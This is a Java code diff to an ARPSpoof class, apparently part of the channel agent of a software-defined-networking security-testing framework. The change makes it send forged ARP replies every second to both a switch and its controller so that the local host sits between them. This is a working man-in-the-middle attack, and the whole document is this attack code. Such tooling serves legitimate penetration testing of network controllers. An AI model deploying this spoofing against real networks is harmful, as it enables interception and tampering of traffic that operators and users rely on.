@@ -5,6 +5,7 @@ import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.Scanner;
 
+import org.deltaproject.channelagent.core.Configuration;
 import org.pcap4j.core.BpfProgram.BpfCompileMode;
 import org.pcap4j.core.NotOpenException;
 import org.pcap4j.core.PcapHandle;
@@ -32,14 +33,18 @@ public class ARPSpoof implements Runnable {
     private String controllerIp;
     private String switchIp;
 
+    private boolean spoofing;
+
     public ARPSpoof(PcapNetworkInterface nif) {
         this.nif = nif;
+
+        this.channelIp = Configuration.getInstance().getChannelIp();
+        this.controllerIp = Configuration.getInstance().getControllerIp();
+        this.switchIp = Configuration.getInstance().getSwitchIp();
     }
 
-    public void setIps(String channel, String controller, String sw) {
-        this.channelIp = channel;
-        this.controllerIp = controller;
-        this.switchIp = sw;
+    public void setARPspoof(boolean value) {
+        spoofing = value;
     }
 
     public void run() {
@@ -59,28 +64,43 @@ public class ARPSpoof implements Runnable {
             String filter = "arp";
             handle.setFilter(filter, BpfCompileMode.OPTIMIZE);
 
-            InetAddress localIP = nif.getAddresses().get(1).getAddress();
+            InetAddress localIP = nif.getAddresses().get(0).getAddress();
             MacAddress localMac = GetAddr.getLocalMac(localIP);
 
-            InetAddress gatewayIP = GetAddr.getGateWayIP(localIP.getHostAddress());
-            MacAddress gatewayMac = GetAddr.getMac(handle, localIP, localMac, gatewayIP);
+            InetAddress controllerIpAddr = InetAddress.getByName(controllerIp);
+            MacAddress controllerMacAddr = GetAddr.getMac(handle, localIP, localMac, controllerIpAddr);
 
-            InetAddress targetIP = InetAddress.getByName("127.0.0.1");
-            MacAddress targetMac = GetAddr.getMac(handle, localIP, localMac, targetIP);
+            InetAddress switchIpAddr = InetAddress.getByName(switchIp);
+            MacAddress switchMacAddr = GetAddr.getMac(handle, localIP, localMac, switchIpAddr);
 
             log.info("Local IP is: " + localIP.getHostAddress());
             log.info("Local MAC is: " + GetAddr.getMacString(localMac));
+            Configuration.getInstance().setIpToMac(localIP.getHostAddress(), localMac);
 
-            log.info("Gateway IP is: " + gatewayIP.getHostAddress());
-            log.info("Gateway MAC is: " + GetAddr.getMacString(gatewayMac));
+            log.info("Switch IP is: " + switchIpAddr.getHostAddress());
+            log.info("Switch MAC is: " + GetAddr.getMacString(switchMacAddr));
+            Configuration.getInstance().setIpToMac(switchIpAddr.getHostAddress(), switchMacAddr);
 
-            log.info("Target IP is: " + targetIP.getHostAddress());
-            log.info("Target MAC is: " + GetAddr.getMacString(targetMac));
+            log.info("Controller IP is: " + controllerIpAddr.getHostAddress());
+            log.info("Controller MAC is: " + GetAddr.getMacString(controllerMacAddr));
+            Configuration.getInstance().setIpToMac(controllerIpAddr.getHostAddress(), controllerMacAddr);
 
             log.info("ARP Spoofing Started");
 
-            while (true) {
-                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, gatewayIP, targetIP, localMac, targetMac));
+            spoofing = true;
+
+            while (spoofing) {
+                // switch -> [channel] -> controller
+                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, switchIpAddr, controllerIpAddr, localMac, controllerMacAddr));
+
+                // controller -> [channel] -> switch
+                handle.sendPacket(buildArpPacket(ArpOperation.REPLY, controllerIpAddr, switchIpAddr, localMac, switchMacAddr));
+
+                try {
+                    Thread.sleep(1000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
             }
         } catch (PcapNativeException e) {
             e.printStackTrace();
